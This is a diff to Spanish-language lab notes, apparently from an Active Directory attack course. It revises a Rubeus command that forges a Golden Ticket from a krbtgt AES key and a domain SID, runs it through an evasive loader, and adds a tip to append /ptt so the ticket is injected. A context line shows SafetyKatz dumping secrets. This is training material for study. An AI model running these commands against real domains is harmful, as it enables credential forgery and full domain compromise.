@@ -815,6 +815,8 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-
 
 Ahora deberemos de crear un *Golden Ticket* con *Rubeus*
 ```shell
-[newShell as Doamin Admin privileges]
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648-502 /ldap /user:Administrator /printcmd
+[studen97]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
 ```
+
+Ahora nos genera un comando el cual nos ayuda a falsificar un *Golden Ticket* Recuerda añadir *-path C:\AD\Tools\Rubeus.exe -args* Después de *Loader.exe* y */ptt* al final del comando generado para inyectarlo en el proceso actual
